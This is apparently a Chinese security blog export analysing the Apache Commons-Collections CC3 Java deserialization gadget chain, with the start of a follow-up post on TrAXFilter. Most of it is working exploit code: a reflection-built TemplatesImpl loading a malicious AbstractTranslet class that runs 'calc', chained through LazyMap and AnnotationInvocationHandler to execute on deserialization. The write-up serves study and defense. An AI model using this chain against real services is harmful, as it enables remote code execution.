      </tags>
  </entry>
  <entry>
    <title>CC3链</title>
    <url>/2025/02/25/CC3%E9%93%BE/</url>
    <content><![CDATA[<h1 id="DdkQJ">CC3</h1>

<p>CC3这条链子和前面的两条链有些不同，在这条链子中我们使用了<strong>动态类加载</strong>替换掉了<code>Runtime.exec</code>，由<strong>命令执行</strong>换为了<strong>代码执行</strong></p>
<h2 id="s50Sm">类加载</h2>

<p><strong>我们来回顾一下动态类加载：</strong></p>
<p>ClassLoader中的<code>loadclass</code>调用<code>findClass</code>，<code>findCLass</code>调用<code>defineClass</code></p>
<ul>
<li><code>loadClass</code> 作用是从已加载的类、父加载器位置寻找类（双亲委派机制），当前面没有找到的时候，调用 <code>findClass</code> 方法</li>
<li>findClass 根据名称或位置来加载类的字节码，其中会调用 <code>defineClass</code></li>
<li><code>dinfineClass</code>作用是处理前面传入的字节码，将其处理成真正的Java类</li>
</ul>
<p>由此我们可以知道，核心部分为defineClass</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740447451341-bad9bc59-2383-4207-ac11-578c6e98ae3f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740447451341-bad9bc59-2383-4207-ac11-578c6e98ae3f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><strong>tips：这里的defineClass需要我们多寻找几种参数类型的，因为有些参数类型的方法在外部并没有被调用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(name, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">            ......</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    ......</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// findClass 方法的源代码</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后findclass会调用defineClass</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="txO1d">CC3攻击链分析</h2>
<h3 id="EoyIp">调用defineClass</h3>

<p><code>defineClass</code>只进行类的加载，而只加类加载是不会执行代码的，所以我们需要找到一个实例化的地方</p>
<p>我们需要找到作用域为public的类，方便我们利用。最后在<strong>TemplatesImpl</strong>中的defineClass找到了调用ClassLoader中的defineClass方法</p>
<p>由于这个类前面并没有标明作用域，所以为default，只有自己的包中可以调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734751868373-b97b78e0-031b-450c-a81c-1185020a9beb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734751868373-b97b78e0-031b-450c-a81c-1185020a9beb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>find usages后，找到了<strong>defineTransletClasses</strong>调用了该方法，但该方法仍然是private方法，我们需要找到public调用的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                ......</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实际上我们找到了三个地方,但具体是否可以让我们利用还得进一步看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734752562295-ad1a8fcd-b223-4f27-a5a8-7fe4f44a35e0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734752562295-ad1a8fcd-b223-4f27-a5a8-7fe4f44a35e0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<ol>
<li>getTransletClasses</li>
</ol>
<p>这里只是把_class原封不动返回并无利用处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _class;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>getTransletIndex</li>
</ol>
<p>这里是把他的下标返回了回来，也无利用处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>getTransletInstance</li>
</ol>
<p>这个方法初始化了我们传入的加载的类，并且将我们这个类返回，我们可以来执行任意代码了</p>
<p>但仍然是一个private方法，继续回找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="W0G6g">调用getTransletInstance</h3>
这里我们只找到了一个方法，幸运的是这个是一个public方法

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734753034929-35de887b-22ad-4291-9abb-fea8c9c18a59.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734753034929-35de887b-22ad-4291-9abb-fea8c9c18a59.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">            .......</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在只需要一个东西去调用newTransformer的newTransoformer方法即可执行恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734753334724-21ae2363-1555-4f65-b4f3-21eb34a99f73.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734753334724-21ae2363-1555-4f65-b4f3-21eb34a99f73.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这简单的两句代码，已经把执行的逻辑走完了，但是内部肯定有一些东西我们需要修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="NAk38">后续调整</h3>
进入到newTransformer，这里是不需要任何赋值，就可以走到getTransletInstance的，我们继续往里走

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754386734-6b0ac1c8-a248-4cec-9c0f-4669636c0763.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754386734-6b0ac1c8-a248-4cec-9c0f-4669636c0763.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里若_name为空则会return所以_name我们需要赋值</p>
<p>我们想要走到definTransletClasses，则需要_class为空，则_class不需要赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754477624-f1e45b61-8ac7-4d63-801a-c71162e53fef.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754477624-f1e45b61-8ac7-4d63-801a-c71162e53fef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这个类的无参构造什么都没有做，但它继承了Serializable接口，我们可以利用发射来修改他的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TemplatesImpl</span><span class="params">()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable</span><br></pre></td></tr></table></figure>

<p>继续走入defineTransletClasses方法，如果_bytecodes为空的话，则会抛出异常，因此我们需要给它赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754888855-72c5af72-ecfe-406b-a40a-aa616c0c5794.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754888855-72c5af72-ecfe-406b-a40a-aa616c0c5794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>下面的_tfactory是需要调用方法的，防止爆空指针错误，导致无法继续执行后面代码，所以我们也需要给他赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734755002019-bf7e3c20-f577-45a2-8a9f-8c28031ef833.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734755002019-bf7e3c20-f577-45a2-8a9f-8c28031ef833.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>现在有三个变量是我们需要去赋值的<code>_name</code>、<code>_bytecodes</code>、<code>_tfactory</code></p>
<p>_name这个变量可以随便赋一个字符串类型的值，这里就不过多赘述</p>
<p>接下来我们看看这个_bytecodes是什么类型的<code>private byte[][] _bytecodes = null;</code>他是一个二维数组</p>
<p>我们看一下<code>defineClass</code>的逻辑，它接收了一个一维数组，我们看看谁调用了它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现在<code>defineTransletClasses</code>方法中调用了它，实际上这里是一个for循环，把二维数组中的每一个数组都遍历出来，我们只需要将一维数组套用到另一个数组内，变成二维数组传入就好</p>
<p>这里的一维数组就是我们传入的字节码对象，<code>defineClass</code>会将他处理成Java类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734755419509-7f74e592-b11e-46bd-8c13-de73763bafa2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734755419509-7f74e592-b11e-46bd-8c13-de73763bafa2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后还有一个_tfactory，它标识了transient，说明在序列化和反序列化时是不会传入的，但是在readObject中会初始化它</p>
<p>我们正着来测试一下它，所以在序列化阶段我们先给他赋值，它是一个<code>TransformerFactoryImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure>

<p>具体代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为_name赋值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为_bytecodes赋值</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//可有可无</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是这里爆了一个空指针错误，我们跟着看一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734757875148-3fcbebbe-2d8d-4c51-97f9-12713f543f73.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734757875148-3fcbebbe-2d8d-4c51-97f9-12713f543f73.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>报错是由<code>defineTransletClasses</code>这个方法的下列部分引起的，如果我们传入字节码对象的父类不为ABSTRACT_TRANSLET，就会走到else部分中，我们上面说过<code>_class</code>是不赋值的，因此我们这里让<strong>执行类</strong>的父类变成ABSTRACT_TRANSLET，上面有标注这个常量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">    <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>使Test继承AbstractTranslet类，并实现他的抽象方法，修改好后编译</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后也是成功弹出了计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734759087945-e38bc780-79fc-475a-91fe-65d02d013e1e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734759087945-e38bc780-79fc-475a-91fe-65d02d013e1e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="s2UMe">调用newTransformer</h3>
现在我们只需要用cc1后半段的代码，来执行`newTransformer`方法即可

<p>这里<code>ConstantTransformer</code>传入templates</p>
<p>用<code>InvokerTransformer</code>去动态调用templates的<code>newTransformer</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">chainedTransformer.transform(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734759533448-dc7c6617-334e-44d2-a7fe-df931133f673.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734759533448-dc7c6617-334e-44d2-a7fe-df931133f673.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后把cc1的后半部分直接拿过来即可使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class,     mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734760804535-f3dbdc29-3cef-4234-8712-af271e14fe9a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734760804535-f3dbdc29-3cef-4234-8712-af271e14fe9a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里实际就是换了一个代码执行的方式，有些黑名单可能对InvokerTransformer进行了过滤，我们从ChainedTransformer新开一条路来执行代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734761204606-5db156a3-e24c-45e0-9e9b-2d8a0f8283f4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734761204606-5db156a3-e24c-45e0-9e9b-2d8a0f8283f4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC3链补充</title>
    <url>/2025/02/26/CC3%E9%93%BE%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<h1 id="ruvzV">CC3链补充</h1>

<p>ysoserial中使用<code>TrAXFilter</code>类，来触发<code>newTransformer</code>方法，最后也可以成功进行类加载</p>
<p>这里我们也进行分析一下</p>
<h2 id="TekEP">CC3攻击链分析</h2>
<h3 id="Bf0xu">调用newTransformer</h3>
我们来看`TrAXFilter`的构造函数，构造时需要传入一个templates ，然后调用他的`newTransformer`方法，但是这个类并没有继承Serializable接口，如果我们能找一个调用其构造函数的方法，我们就可以成功执行代码

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Y9hKV">调用TrAXFilter构造方法</h3>

<p>CC3的作者找到了<code>InstantiateTransformer</code>这个类，看名字就知道这个类是用来初始化<code>Transformer</code>的</p>
<p>它会判断你传入的是不是一个Class类型，如果是的话就会调用其指定参数类型的构造器</p>
<p>我们需要new一个<code>InstantiateTransformer</code>，将构造器的参数类型和参数传入，然后将<code>TrAXFilter</code>的class类传入，它就会根据参数类型去调用TrAXFilter的构造方法，并将参数传入</p>
<p>最后一步就会return我们构造好并进行实例化的类</p>
